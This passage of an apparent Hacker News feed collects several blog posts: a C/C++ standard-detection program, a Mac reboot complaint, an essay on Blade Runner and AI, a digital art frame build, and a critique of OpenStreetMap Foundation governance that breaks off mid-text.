<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-883">

    

	<div>

		
<p>The following is a bit of a write up of a program I wrote for a presentation to a bunch of Java programmers(really this was part of a workshop on Qt for Android Programmers) to illustrate that C and C++ are very different languages, and the differences between standards can be large even if the program compiles.  So I tried making this as straightforward as possible.  A ton of people have written up similar things. Hopefully the value here is in the simplicity of the presentation(I tried making it accessible to people with only Java programming experience). I was heavily inspired by <a href="http://ioccc.org/2015/yang/prog.c">Don Yang’s 2015 IOCC entry</a>(Some commentary <a href="http://ioccc.org/2015/yang/hint.html">here</a>, and a fun video of him making it <a href="http://ioccc.org/2015/yang/spoiler.html">here</a>).</p>



<p>Imagine we would like to create a single program which when compiled would tell us how which standard of C or C++ it was compiled with.  Obviously we cannot use any features not common to both C and C++, so no template magic, and so we won’t be able to distinguish between C++98 and C++03 or between C++11,C++14, C++17, or C++20. Obviously we won’t try to tell the difference between C89 and C90 as well. And we will only consider C after C89 since it was not always implemented consistently prior, and K &amp; R function signatures are ugly.   We will try to not use the C preprocessor as much as possible, but in order to tell post-C11 from pre-C11 we need to introduce some macros.</p>



<p>One of the first and simplest differences is between C and C++. In C a character literal like ‘a’ is the same size as an int.  In C++ it is the same size as a char.  Now if you are on a platform where an int and char are the same size, then you will need a different test(In this day and age Fall 2020, even most embedded chips are moving to 32bit ARM/RISC-V/whatever else(I believe most 16bit chips in common use have an int with distinct size from char), where we wouldn’t expect this to be the case). So our first function is:</p>


<pre title="">static int is_C(void){
    int a=0; char b='\0';
    assert(sizeof(a)!=sizeof(b)); /*bail out early on unusual archs.*/
    return (sizeof ('\0') == sizeof(a));
}
</pre>


<p>The next major difference is between C before C99 and C after C99.  The big change was that C++ style inline comments were allowed.  So instead of just ‘/* whatever */’ you could use ‘// whatever’. This leads us to:</p>


<pre title="">static int is_post_ANSI_C(void){
    return 1//**/2
            ;
}
</pre>


<p>So if we have C++ style inline comments we return 1 since the rest of the line is a comment.  If we don’t then we have a ‘/’ followed by a comment followed by 2, so after comment and whitespace removal we get ‘return 1/2;’ which we know by the rules of integer division is 0.</p>



<p>Next in-order to differentiate versions of C and C++ after 2011, and ones before we will need to use a C Preprocessor macro.  After the C11 and C++11 revisions the language changed somewhat dramatically by adding some new prefixes for string literals to allow for the use of Unicode in strings(see <a href="https://en.cppreference.com/w/cpp/language/string_literal">this page</a> for a good reference to what the various prefixes mean, in general cppreference.com is a good source of information on either C or C++).  Here is our macro and function:</p>


<pre title="">#define test(U) U"1"
static int is_post_11(void){
    return (sizeof(test()[0]) &gt;1);
}
</pre>


<p>This uses a trick from Don Yang’s entry, in that in prior versions of the standard the preprocessor would view the ‘U’ in the definition as the value of the argument given to the ‘test’ function-type macro.  In the return statement we pass in no argument so the ‘U’ is replaced by nothing, and we just get ‘sizeof(“1″[0]) &gt;1’ which is just ‘sizeof(char) &gt;1’ which is always false.  In later editions of the standards the ‘U’ is parsed as a prefix to a string literal, in this case a 32bit wide unicode string, so each element in the string that follows the ‘U’ character must be at least 32 bits wide.  As long as we aren’t on an architecture with &gt;=32 bit chars this will lead to ‘sizeof(something at least 32bit) &gt;1’ which will be true for this case.</p>



<p>If proposal N2231 for the C2x standard goes through then both C++20 and C2x will have a char8_t datatype which will be the type of ‘u8’ prefixed string literal which would be another test we could do.</p>







<p>The final program is here:</p>


<pre title="">#include &lt;stdio.h&gt;
#include &lt;assert.h&gt;
 
static int is_post_ANSI_C(void){
    return 1//**/2
            ;
}
 
static int is_C(void){
    int a=0; char b='\0';
    assert(sizeof(a)!=sizeof(b)); 
    return (sizeof ('\0') == sizeof(a));
}
 
#define test(U) U"1"
static int is_post_11(void){
    return (sizeof(test()[0]) &gt;1);
}
 
int main(int argc, char *argv[])
{
    int C = is_C();
    int post_11 = is_post_11();
    int post_ANSI_C = is_post_ANSI_C();
 
    if(C &amp;&amp; post_ANSI_C &amp;&amp; post_11){
        printf("This is C11 or later!\n");
    }
    if(C &amp;&amp; post_ANSI_C &amp;&amp; !post_11){
        printf("This is C99!\n");
    }
    if(C &amp;&amp; !post_ANSI_C &amp;&amp; !post_11){
        printf("This is C89 or C90\n");
    }
    if(!C &amp;&amp; post_11){
        printf("This is C++11 or later\n");
    }
    if(!C &amp;&amp; !post_11){
        printf("This is C++98 or C++03\n");
    }
 
    return 0;
}
</pre>


<p>Which can be compiled with:</p>


<pre title="">gcc -std=c89 main.c
</pre>


<p>Or</p>


<pre title="">g++ -std=c++98 main.c
</pre>


<p>Then it can be run as:</p>


<pre title="">./a.out
</pre>


<p>valid values of the ‘std’ option to try are ‘c90’, ‘c99’, ‘c11’, ‘c++03’, ‘c++11’, etc. More given <a href="https://gcc.gnu.org/onlinedocs/gcc/C-Dialect-Options.html#C-Dialect-Options">here</a>.</p>

	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://abqexpert.com/2020/11/24/c-is-not-a-subset-of-c-a-simple-program-to-show-differences-in-the-c-and-c-standards/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25205170</guid>
            <pubDate>Wed, 25 Nov 2020 01:56:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Remember when you could reboot your computer without rebooting your phone first?]]>
            </title>
            <description>
<![CDATA[
Score 76 | Comments 54 (<a href="https://news.ycombinator.com/item?id=25205031">thread link</a>) | @mdoms
<br/>
November 24, 2020 | https://annoying.technology/posts/7b574a72da90e5cd/ | <a href="https://web.archive.org/web/*/https://annoying.technology/posts/7b574a72da90e5cd/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://d33wubrfki0l68.cloudfront.net/31a8603310fa498ae382fe6140ad8db20c277711/6bc2e/media/neustartdoeswell.png"></p><p>Remember when you could reboot your computer without rebooting your phone first?</p><p>I’m not even kidding: I needed to reboot my Mac because I was unable to navigate character by character using the arrow keys when composing new iMessages in Big Sur, but Finder refused to quit during the reboot with the above error message. It was still syncing my iPhone. (Remember when we thought the iTunes rewrite would be a good thing? <a href="https://twitter.com/manu_faktur/status/1260099839511212032">Good Times</a>!) I tried quite a few things on both devices, but was unable to cancel said sync in any other way than to reboot the phone.</p></div></div>]]>
            </description>
            <link>https://annoying.technology/posts/7b574a72da90e5cd/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25205031</guid>
            <pubDate>Wed, 25 Nov 2020 01:30:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Blade Runner tells us about Modern AI]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25204662">thread link</a>) | @laurex
<br/>
November 24, 2020 | https://www.psychoftech.org/blog/2020/11/13/what-blade-runner-tells-us-about-modern-ai | <a href="https://web.archive.org/web/*/https://www.psychoftech.org/blog/2020/11/13/what-blade-runner-tells-us-about-modern-ai">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-62701a95677011374ee2"><div><p>Pope Francis <a href="https://www.vaticannews.va/en/pope/news/2020-11/pope-francis-november-prayer-intention-robotics-ai-human.html">recently devoted</a> his monthly prayer intention to the safe and beneficial development of artificial intelligence. Though the prayer was expressed primarily in terms of reducing inequality, a theme this Pope has touched on often, its final plea had an uncanny resonance: <em>“Let us pray that the progress of robotics and artificial intelligence may always serve humankind… we could say, may it ‘be human.’”</em></p><p>The question of what it is to “be human,” as distinct from the rest of Creation, has concerned the Church for centuries. It was a driving force behind the philosophy of Descartes, whose strong mind-body dualism was in part an attempt to reconcile Church doctrine with the dawning rationalist tradition. Though Descartes was primarily concerned to distinguish us from animals, which he considered mere automata, the specter of a fully mechanical account of humanity looms over his work. Even in the last century, as AI has become less of a fantasy and more of a research program, this fundamental ambivalence remains. We strive to build machines in our own image, and to conceive of ourselves in mechanistic terms, and yet each step we make in this direction unnerves us. The prospect of closing the gap entirely, though it is the stated aim of both AI and cognitive science, strikes most people as horrifying.</p><p>Nowhere is this ambivalence better expressed than in <em>Blade Runner</em>, Ridley Scott’s 1982 sci-fi masterpiece. The film takes place in an imagined 2019, and though it may have overshot the mark in some of its technological details (no flying cars), it could not be sharper with respect to the anxieties that define our age. Scott imagined a world controlled by a few large corporations that have become enormously profitable through the development of intelligent machines. These humanoid robots, known as “replicants,” are primarily consigned to narrow, routine jobs, but there is a pervasive fear that they will infiltrate other areas of human life. The film tells the story of Deckard (a deliberate homonym of Descartes), a so-called “blade runner” charged with hunting down a group of replicants that have escaped from an off-world colony. Deckard disdains replicants, but in his pursuit, he unwittingly falls in love with one, and confronts the possibility that he might be a replicant himself.&nbsp;</p><p>This fear of mistaken identity is distilled, in the popular consciousness, in the image of the Turing Test. Originally proposed by Alan Turing as a test of whether machines could think, the connotations of the test have shifted in response to technological development. At its core, the meaning of the test is existential. As Brian Christian <a href="https://www.amazon.com/Most-Human-Artificial-Intelligence-Teaches/dp/0307476707">writes</a>:&nbsp;</p><blockquote><p>“The Turing test attempts to discern whether computers are, to put it most simply, ‘like us’ or ‘unlike us’: humans have always been preoccupied with their place among the rest of creation. The development of the computer in the twentieth century may represent the first time that this place has changed. The story of the Turing test, of the speculation and enthusiasm and unease over artificial intelligence in general, is, then, the story of our speculation and enthusiasm and unease over ourselves. What are our abilities? What are we good at? What makes us special?”</p></blockquote><p><em>Blade Runner</em> features a Turing Test analog known as the Voigt-Kampff Test, the purpose of which is to weed out replicants posing as human beings. The theoretical basis for the test is never quite made explicit; we know only that it has something to do with conversation and various physiological responses. But in the failed responses of one escaped replicant, Leon, we recognize shortcomings that still plague AI systems today.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1605292311943_32260"><div><p>Modern machine learning systems face a tradeoff: learn too little from the training data and performance will be too random, but hue too closely to the training data and performance will not generalize to new examples. In the jargon of the discipline, the former kind of error is called “underfitting”; the latter “overfitting.” Usually, engineers seek out a sweet spot between these two with respect to a particular narrow problem. By comparison with the goal of a truly flexible intelligence, though, all modern AI systems are drastically overfitted. They are highly specialized to a particular task and brittle in their application. Leon, too, was designed for a particular task: we’re told he can “lift atomic loads all day and night.” When Holden, the test administrator, begins to take him beyond the scope of that task into a hypothetical, he overfits, seeking too much specificity.</p><blockquote><p><em>“You’re in a desert walking along the sand…”</em></p><p><em>“What one?”</em></p><p><em>“What?”</em></p><p><em>“What desert?”</em></p><p><em>“It doesn’t make any difference what desert. It’s completely hypothetical.”</em></p><p><em>“But how come I’d be there?”</em></p></blockquote><p>Modern AI systems can often perform exceedingly well within their domain, giving an illusion of generality. A system from DeepMind, for example, learned to play various Atari games at a superhuman level. But <a href="https://www.technologyreview.com/2020/03/27/950247/ai-debate-gary-marcus-danny-lange/">a demonstration from the robotics startup Vicarious</a> showed that the system lost all abilities when the pixels on the screen were slightly moved. This sensitivity to slight adjustments makes deep learning systems too vulnerable for many real-world applications. Leon, too, is highly sensitive to slight novelty.</p><blockquote><p><em>“You look down and you see a tortoise, Leon. It’s crawling towards you.”</em></p><p><em>“Tortoise? What’s that?</em></p><p><em>“You know what a turtle is?”</em></p><p><em>“Of course.”</em></p><p><em>“Same thing.”</em></p></blockquote><p>The ability to flexibly adapt to novel circumstances remains, for the time being, uniquely human. We reflect, in our cognitive capacities, the bottomless complexity of the physical and social world to which we are adapted. And indeed <a href="https://www.pnas.org/content/108/4/1234">there is evidence</a> that even roboticists pursuing purely <em>pragmatic</em> objectives of behavior in a real-world environment can best achieve these goals through the <em>biological</em> strategies of evolution and development. To give machines our abilities, it seems, we have to give them our histories.</p><p>It is no surprise, then, that the question that drives Leon over the edge and leads him to shoot Holden is one about his past.</p><blockquote><p><em>“Describe in single words only the good things that come into your mind about your mother.”</em></p></blockquote><p>Unlike the more recent model replicants in the film, Leon has not been given memories, and so has no personal history to speak of. The philosopher John Locke believed that the continuity of our memories was the seat of our selfhood, because it is only by virtue of this continuity that we know ourselves to be the same person from one moment to the next. And indeed, part of what makes interacting with even a cutting-edge AI system like GPT-3 so uncanny is the lack of a unitary identity. Paradoxically, this multifarious identity is part of what helps such systems behave intelligently. As Brian Christian <a href="https://www.amazon.com/Most-Human-Artificial-Intelligence-Teaches/dp/0307476707">writes</a>, “[t]o be human is to be <em>a</em> human, a specific person with a life history and idiosyncrasy and point of view; artificial intelligence suggests that the line between intelligent machines and people blurs most when a purée is made of that identity.” Here, the division between intelligence and <em>humanity</em>, whatever that term may turn out to mean, becomes especially stark. A deep neural network trained on hundreds of thousands of conversations may be intelligent, but it cannot give us the comforting cues that tell us we are interacting with a particular person.</p><p>As <em>Blade Runner</em> makes clear, though, the various cues to our humanity are just that: cues. A replicant with memories is a person in every sense that counts. And as long as we don’t believe in a mystical ghost in the machine, we are forced to concede that there are no guarantees about which capacities and traits will remain uniquely human. Consciousness may persist as an unsolvable mystery, but when robots begin to imitate all the outward signs we use to attribute consciousness to our fellow humans, this mystery will lose its salience. As Sam Harris and Paul Bloom point out in <a href="https://www.nytimes.com/2018/04/23/opinion/westworld-conscious-robots-morality.html?mc_cid=7003ba28a2&amp;mc_eid=%5BUNIQID%5D&amp;utm_campaign=7003ba28a2-EMAIL_CAMPAIGN_2018_04_23&amp;utm_medium=email&amp;utm_source=Sam%20Harris%20Newsletter&amp;utm_term=0_f1c2a2c9db-7003ba28a2-">a 2018 op-ed</a>, “Anything that looks and acts like the hosts on ‘Westworld’ [or, indeed, the replicants in <em>Blade Runner</em>] will appear conscious to us, whether or not we understand how consciousness emerges in physical systems.” This future may be far off, but the questions it poses are already with us. With each new development, we’ll have to ask ourselves: how human is human enough?</p></div></div></div>]]>
            </description>
            <link>https://www.psychoftech.org/blog/2020/11/13/what-blade-runner-tells-us-about-modern-ai</link>
            <guid isPermaLink="false">hacker-news-small-sites-25204662</guid>
            <pubDate>Wed, 25 Nov 2020 00:31:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Canvas Made of Pixels]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25204468">thread link</a>) | @sabon
<br/>
November 24, 2020 | https://www.claybavor.com/blog/a-canvas-made-of-pixels | <a href="https://web.archive.org/web/*/https://www.claybavor.com/blog/a-canvas-made-of-pixels">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-e4d84132f42c63276145"><div><p>A year ago over the holiday break, I created a large-scale digital “canvas” that can reproduce works of fine art – paintings, photographs, lithographs, etc. – in a way that is nearly indistinguishable from the real thing.</p><p>For the full effect, you really need to see it in person. But so you can get the idea, here’s a photograph of the frame displaying a Van Gogh:</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1493995847697_203326"><div><h3>The Problem with Digital Picture Frames</h3><p>I’ve been interested in digital picture frames since 2003, when I made my first custom frame out of a cannibalized Apple iBook. The promise of digital picture frames, of course, is that they can display new stuff whenever you want – photos, paintings, whatever. But there’s a real problem with digital picture frames: they just aren’t very good.</p><p>What do I mean? To start, in commercially available digital picture frames, you’ve generally got a big black plastic bezel surrounding the display, so the picture frame looks more like a small television than a picture frame. The display itself is all wrong, too. You can see individual pixels, the viewing angle is limited, the contrast is low, and the standard aspect ratio (16×9) of modern displays is too wide for photos and fine art. And until recently, no one has made a <em>big</em>&nbsp;digital picture frame, so the largest thing you could display was a 5×7 or 8×10 photograph. Finally,&nbsp;because screens emit rather than reflect light, they usually appear either too light (glowing) or too dark (washed out), so they <em>look</em>&nbsp;like screens.</p><p>With this project, I set out to tackle all of these problems, and to create something so good at reproducing artwork that a viewer forgets (or never even realizes) that he or she isn’t just looking at the real thing.</p><h3>Lots and Lots of Pixels</h3><p>The first task was to find a large display with very high resolution, accurate color reproduction, a good contrast ratio, and a wide viewing angle.</p><p>The resolution requirement for the display was informed by how people generally look at art: you start at a bit of a distance to take in the piece, then may walk up to it and lean in to inspect details, getting as close as maybe a foot away. If you do the math, at that viewing distance, you need a pixel density of about ~285 pixels per inch to keep individual pixels below the resolving capability of the human eye at the fovea, which is about 60 pixels per degree. (I’ll skip the math and detail about angular resolution and the human eye. If you’re interested, you can read more <a href="https://en.wikipedia.org/wiki/Angular_resolution">here</a>&nbsp;and <a href="https://en.wikipedia.org/wiki/Naked_eye">here</a>.)</p><p>Today, there’s really only one large display that approaches this kind of resolution: the 5K display on the 27” iMac, which has a pixel density of about 220 ppi and an overall resolution of 5120 by 2800 pixels. (If you’re wondering, 4K “Ultra HD” TVs aren’t even close to having enough resolution for this application. A 40-inch 4K TV is only ~110 ppi.)</p><p>Unsurprisingly, Apple also did a great job with the color reproduction and viewing angle on the iMac display. So I had my display.</p><h3>Aspect Ratios and Gilded Wood</h3><p>The next thing I looked at was the frame itself: the material, the dimensions, the mat, and how to make it so the whole thing could be mounted flush against a wall, just as real paintings or photographs are.</p><p>The first thing I wanted to get right was the aspect ratio of the frame, since it would determine what works of art I’d be able to display, as well as the dimensions of the frame itself. As it turns out, an aspect ratio of 16×9 (or 1.77:1) – which is the aspect ratio of the iMac display and basically every other display on the market today – is really bad for displaying fine art, which tends to be much “squarer”. For instance, the average aspect ratio of the works below is ~1.3:1. The Mona Lisa, the “least square” of the bunch, has an aspect ratio of 1.45:1, still significantly squarer than 16:9.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_14_1494706960442_8923"><div><p>Of course, I wasn’t about to saw off the sides of the 5K display. Instead, I designed the frame and mat to overcrop the display, resulting in an aspect ratio of around 1.4:1 – still a bit wide, but a good tradeoff between using most of the display and accommodating most works of art without having to chop their sides off.</p><p>Next I turned to the frame material. I wanted something that looked totally unlike anything you’ve seen around a computer monitor or television – a sort of “anti black plastic”. And that led me to a handmade, gilded wood frame, with a classic profile and a good amount of patina.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_14_1494706960442_11714"><div><p>With the dimensions and frame material set, my last task was to figure out how to mount the whole unit so that it would sit exactly flush with the wall. After cutting a hole in the wall, I had to figure out mechanisms for making millimeter-scale adjustments (solution: screws and wood shims) and properly ventilating the computer while sealed away in the frame (solution: discrete ventilation slats on the bottom of the frame).</p><h3>Photons that Fit In</h3><p>The most interesting problem to tackle was “the blue glowing screen problem”.</p><p>One of the many ways that screens give themselves away as screens is by emitting light that is “out of character” with the surrounding environment. They can be too bright or too dark relative to the things around them, and indoors, displays often seem too blue.</p><p>I solved these problems with what I call “luminance matching”. The basic idea is to sample the light falling on the frame several times a second, and then adjust the display and image parameters so that what’s displayed is “correct” given the surrounding environment.</p><p>To solve the brightness problem, I embedded a photodiode – basically a brightness sensor – into the side of the frame, directed at the wall the frame is hanging on. The frame takes luminance readings off of the photodiode via a <a href="http://www.phidgets.com/">Phidgets</a>&nbsp;USB sensor interface, then automatically adjust the brightness of the display. Getting the mapping from sensor readings to display brightness was a bit tricky, and I ended up using two photodiodes –&nbsp;one for the wall, one for the display –&nbsp;to perform a calibration step, so that the luminance of the actual white wall matched the luminance of the display while displaying a photograph of the white wall.</p><p>For the color matching / white balance problem, I began with the somewhat complicated approach of using an attached USB camera, turning off its automatic white balance, and sampling frames every few seconds to estimate the color of the incoming light. This approach turned out to be overkill, since the color temperature of the light in the hallway where the frame is hanging is very predictable over the course of a day. So instead, I ended up using the awesome little tool <a href="https://justgetflux.com/">Flux</a>, which can adjust the white balance of a display according to the time of day.</p><p>All of this comes together to enable the frame to respond to changing lighting conditions in the same way that a real photograph or painting would.</p><p>You can see it in action here, where I cycle through several different lighting conditions, from dim daylight, to overhead halogens, to simulated direct sunlight. While filming, the exposure settings on the camera were locked, so you can get a sense for changes in lighting across the whole scene, including on an identical (real) photograph hanging opposite the digital frame.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_14_1494706960442_15377"><div><p>The effect in person is really quite startling: guests in our house almost never register that the photograph or painting is being displayed is anything other than a photograph or painting.</p><h3>Shy Mode</h3><p>The final feature I added was what I call “shy mode”. When shy mode is enabled, the picture frame uses a discrete camera and a simple face detection system to determine whether anyone is currently looking at it. If someone is, then the frame won’t change what it’s displaying, since that would be a total giveaway.</p><p>A fun (but impractical and frustrating) variant of this feature is to have the image change <em>as soon as</em>&nbsp;the viewer looks away. So you’re looking at a painting, glance away to another room, and look back to find a new painting hanging on the wall.</p><h3>For Version 2.0</h3><p>Building version 1.0 exposed all sorts of things that could be better.</p><p>Of course, using a whole iMac just for its display is totally impractical. A custom display with a lightweight, Android-runnning system on a chip to drive it would be much better. The ideal display would be something like a 5:7 aspect ratio 55” 8K OLED panel. (OLED would enable a much higher contrast ratio and better viewing angles.) Wireless power or trickle charging of an onboard battery would avoid unsightly power cords or wall surgery. And a richer set of sensors for doing luminance matching and presence sensing would be nice, too.</p><p>In the meantime, I’m pretty excited about what companies like <a href="https://depict.com/">Depict</a>&nbsp;and <a href="https://www.electricobjects.com/">Electric Objects</a>&nbsp;are doing. Their products could be better – the 16:9 aspect ratio is really off in my opinion, OLED will be important, and 4K resolution isn’t enough – but they’re off to a good start. I’m really excited to see what they and others come up with in this space.</p><p>Thanks to Mahmut at Sumner Frames in Palo Alto for helping me with the framing, to Andrew Luo for his help writing various pieces of software, and to Kelly for being okay with me cutting a big hole in our wall.</p></div></div></div>]]>
            </description>
            <link>https://www.claybavor.com/blog/a-canvas-made-of-pixels</link>
            <guid isPermaLink="false">hacker-news-small-sites-25204468</guid>
            <pubDate>Wed, 25 Nov 2020 00:01:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Openstreetmap Foundation: past year changes, their meaning in coming years (2/2)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25203902">thread link</a>) | @liotier
<br/>
November 24, 2020 | http://blog.imagico.de/the-osmf-changes-during-the-past-year-and-what-they-mean-for-the-coming-years-part-2/ | <a href="https://web.archive.org/web/*/http://blog.imagico.de/the-osmf-changes-during-the-past-year-and-what-they-mean-for-the-coming-years-part-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>In <a href="http://blog.imagico.de/the-osmf-changes-during-the-past-year-and-what-they-mean-for-the-coming-years-part-1/">the first part of this blog post</a> i summarized the most important developments in the <a href="https://wiki.osmfoundation.org/wiki/Main_Page">OpenStreetMap Foundation (OSMF)</a> during the past year from my perspective.  In this second part i will – based on the observations from the past year and recent trends being visible – give a lookout on how the OSMF could develop in the coming years.</p>
<p>After <a href="http://blog.imagico.de/osmf-general-meeting-and-board-elections/">my previous piece on the OSMF</a> and the perspective for the upcoming general meeting, <a href="https://www.openstreetmap.org/user/SeverinGeo/diary/394528">Severin Menard has published an interesting and likewise critical take on the current situation of the OSMF</a>.  I agree with most of what he wrote and his culturally somewhat different perspective on things is very valuable.  Definitely recommended for everyone to read.</p>
<p><img src="http://blog.imagico.de/wp-content/uploads/2020/11/osmf-gm2020f.png" alt="" width="512" height="278" srcset="http://blog.imagico.de/wp-content/uploads/2020/11/osmf-gm2020f.png 512w, http://blog.imagico.de/wp-content/uploads/2020/11/osmf-gm2020f-320x174.png 320w" sizes="(max-width: 512px) 100vw, 512px"></p>
<h3>Corporate takeover – it has already happened</h3>
<p>There is one thing however i disagree on with him – the assessment of a corporate takeover as a risk of the future. During the past weeks there have also been <a href="https://lists.openstreetmap.org/pipermail/osmf-talk/2020-October/thread.html#7300">some</a> half baked <a href="https://lists.openstreetmap.org/pipermail/osmf-talk/2020-October/thread.html#7302">initiatives</a> started (last minute before the general meeting as usual) from within the OSMF board towards resolutions meant to protect the OSMF against external takeover.  My view is that these measures and the focus on a defensive strategy against an external attack aimed at controlling the OSMF are meanwhile setting the wrong priorities because the corporate takeover has essentially already happened behind the scenes without that being clearly visible to the outside.</p>
<p>Large corporate OSM data users are not really that interested in staging a coup in the OSMF and run the OSMF themselves at this time.  That would be expensive to do and bear a large spectrum of fairly big risks and also it would – if successfully executed – immediately lead to a struggle for control between the major corporate players.  The main goal of corporate actors with the OSMF is and has been for some time to prevent meaningful regulation of corporate activity in OSM and of OSM data use based on the OdbL.  If that goal is secured, a secondary goal would be for the OSMF to serve as a shared neutral intermediary platform between the different corporations to steer independent volunteer activity in the OSM community in the corporate data users’ collective interests.</p>
<p>The parts of the OSMF board not affiliated with corporate or organized interests seem to have, during the past years, developed the idea that these corporate interests can be negotiated with and that the future of OpenStreetMap lies in compromising between the organized and corporate interests and the core ideas and values of the project.  This quite clearly is an illusion – expecting a big corporation like Facebook to make compromises with an insignificant player like the OSMF is at best naive.</p>
<p>If the goal to prevent meaningful regulation of corporate activity through the OSMF has been accomplished permanently, corporations have no reason to oppose effective takeover prevention of the OSMF – because that would help protecting their position in the OSMF against third parties gaining influence.  And effective prevention of meaningful regulation does not even depend on there being a pro-corporate majority among the OSMF members because the corporations have other significant channels of influence in the OSMF now (through their financial constributions, through their participation in the working groups and through lobbying of the board on non-public channels).</p>
<p>We will in the near future have a fairly good test case for how robust the ability of corporate interests in the OSMF is in preventing meaningful regulation in form of the attribution guideline that has been worked on during the past years.  There are essentially three scenarios of what could happen:</p>
<ul>
<li>The OSMF board decides to adopt a guideline roughly based on <a href="https://wiki.openstreetmap.org/wiki/Draft_Attribution_Guideline">the corporate wishlist from the LWG</a> with some <a href="https://wiki.openstreetmap.org/wiki/Draft_Attribution_Guideline/2020v2">minor adjustments for the optics</a>, to maintain the impression that it is not directly what corporate lobbyists have written.  That seems the most likely scenario at the moment but it bears the strong risk that the craft mapper community will openly oppose this interpretation of the ODbL which would fundamentally endanger the OSMF’s position in the OSM community.</li>
<li>The OSMF board adopts a guideline reflecting the community consensus reading of the ODbL (likely similar to <a href="https://wiki.openstreetmap.org/wiki/Community_attribution_advice">what i drafted</a>) that unconditionally requires attribution that practically makes the user aware of the origin of the data.  That would be strongly against the corporate interests and corporations would certainly do everything within their power to prevent that (including withdrawing funds which would leave the OSMF in financial peril because the strongly increased costs make it depend on regular corporate contributions).</li>
<li>A decision on the matter is avoided by dragging out the process indefinitely.  Although not ideal, because it would be a kind of unstable situation, this would be acceptable for the corporations because it would maintain the status quo of the OSMF not becoming active against data users with insufficient attribution.  It would also avoid an open break with the OSM community, although there would be likely increasing pressure from the OSM community on the OSMF to get active in cases of insufficient attribution by the OSMF’s corporate financial contributors.</li>
</ul>
<p>Some will likely reject my idea that the corporate takeover of the OSMF has already happened.  They will argue that if that was true, corporations would push much more aggressively for their interests.  I don’t think that is the case though.  As explained, the primary interest large corporations have in the OSMF is not positively accomplishing something, it is preventing things negative for their interests from happening.  Accomplishing that is much more valuable for them than anything they could proactively try to push for in the OSMF.</p>
<p>What we will certainly see in the coming years is corporations trying to consolidate their influence on the OSMF, in particular by more and more corporate employees being encouraged to volunteer and being paid for work on the OSMF in the working groups, on the board, in committees and other ways.  This will happen rather quickly in most of the working groups probably, supported by the move of the OSMF to position itself more like a corporate actor which, as i have explained before, is likely going to have a negative effect on motivating volunteers without career interests in OSM for the OSMF.  My estimation is that in 1-2 years a solid majority of the people engaged actively in the OSMF in one way or the other is either employed in some form in an OSM related job or otherwise has a carreer interest at least partly motivating their involvement in the OSMF.  Most of them will be employed by corporate OSM data users or organizations around OSM like HOT.  Currently in the OSMF board for example we have already at least three members to whom this applies, two corporate employees (Mikel and Paul), one small business employee (Rory).</p>
<p><img src="http://blog.imagico.de/wp-content/uploads/2020/11/osmf-gm2020g.png" alt="" width="512" height="278" srcset="http://blog.imagico.de/wp-content/uploads/2020/11/osmf-gm2020g.png 512w, http://blog.imagico.de/wp-content/uploads/2020/11/osmf-gm2020g-320x174.png 320w" sizes="(max-width: 512px) 100vw, 512px"></p>
<h3>Centralization of the OSMF</h3>
<p>The other big upcoming trend in the OSMF i can observe is an increased centralization of power towards the board.  The OSM community overall is highly decentralized and the OSMF has always been kind of an abnormality within that with its hierarchical structure.  But traditionally in the OSMF most of the work has been done in the working groups – including development of policies – and the working groups had a high degree of independence, starting from being created by grassroot initiative from within the community, to allowing also non-OSMF members to participate and to by convention allowing board members to contribute, but not allowing them to have a lead role.  We more recently, however, see a trend towards more and more policy being either actively influenced by the board or being developed by the board itself from the start.  Early manifestations of this trend were the already mentioned Crimea decision (where the board overruled standing policy developed by the working groups) and the organized editing policy (where the board flat out rejected the first draft of the DWG and demanded a more lenient policy).  This year we saw a large number of cases where the board created internal policy, often presenting the results as a done deal without having an open discussion – like in case of the diversity statement – further emphasizing this trend.</p>
<p>In addition, as i have discussed in the first part, we saw during the past year the establishment of several committees (a concept that previously did not exist in the OSMF) – put together by and under direct control of the board.  And for this year’s general meeting <a href="https://wiki.osmfoundation.org/wiki/Board/Minutes/2020-11#2020.2FRes61_That_the_Board_recommends_the_members_vote_Yes_to_change_the_AoA_to_allow_non-board_members_on_committees">we have an AoA change proposed</a> that allows the establishment of committees consisting of board members and OSMF members and to delegate any powers of the OSMF board to these.  In other words:  It would allow the OSMF board to recruit volunteers or paid staff (paid by either the OSMF or by third parties) and delegate any kind of function of the board to them.  Obviously, such committees would be under immediate and absolute control of the board, people could become members of such committees only by appointment by the board and the board could dissolve or remove powers from such a committee at any time.  But, in contrast to the working groups – which don’t have any formal powers and depend for any meaningful decisions on approval by the board – the commitees could be equipped with any of the formal powers and rights the board has within the OSMF.</p>
<p>The effect the establishment of such committees would have is a massive shift in power within the OSMF from the working groups towards the board.  Currently the board is essentially limited in what they can do by their numbers.  Board members are not able to delegate their formal powers to others.  Work requiring more hands can only be done by the working groups, which have a high degree of independence.  If the mentioned resolution passes, the board would essentially no more depend in any way on the working groups of the OSMF – they could assign any tasks so …</p></div></div>
